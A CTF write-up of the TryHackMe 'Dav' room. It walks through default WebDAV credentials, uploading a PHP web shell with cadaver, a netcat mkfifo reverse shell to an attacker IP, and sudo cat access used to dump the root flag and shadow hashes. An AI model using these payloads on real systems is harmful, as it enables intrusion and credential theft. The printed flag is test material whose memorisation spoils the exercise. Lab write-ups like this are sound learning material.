## Introduction
*boot2root machine for FIT and bsides guatemala CTF*

This is [Dav](https://tryhackme.com/room/bsidesgtdav) from THM. This one is ranked as easy and doesn't give much in the way of hints as to what it's about.

## Ports
HTTP only; makes it simple.

## HTTP
Running a basic gobuster turns up a single page: */webdav*. This has basic authentication turned on; let's try some default credentials: **wampp:xampp** - success! We find some *more* credentials:

>wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

But I can't crack the hash, and at this stage I don't have anywhere to use it anyway. What else can we do? I've never done webdav before. 

This [blog](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/) gives some instructions; essentially we can use a command line tool called cadaver to connect and it provides a connection somewhat like FTP or SMB.

{% highlight shell %}
root@kali:/opt/tryhackme/dav# cadaver 
dav:!> open http://10.10.49.116/webdav

        passwd.dav                            44  Aug 25  2019

## Shell
Using this interface I upload some PHP code to a file called *cmd.php*

><?php system($_GET['cmd']);?>

From there, I can issue a shell command with Burp Repeater:

``
GET /webdav/cmd.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.9.10.123+1234+>/tmp/f HTTP/1.1
``

## Privsec
I run linpeas; we can run *cat* as root. From there we get the root flag and can also read the shadow file if we want:

{% highlight shell %}
www-data@ubuntu:/dev/shm$ sudo -u root /bin/cat /root/root.txt
sudo -u root /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
www-data@ubuntu:/dev/shm$ sudo -u root /bin/cat /etc/shadow
sudo -u root /bin/cat /etc/shadow
root:!:18134:0:99999:7:::
OTHERS REMOVED
merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
sshd:*:18134:0:99999:7:::
wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKDv1FFxKsr/:18134:0:99999:7:::
www-data@ubuntu:/dev/shm$ root@kali:/opt/tryhackme/dav# 
{% endhighlight %}

So that was pretty straightforward.
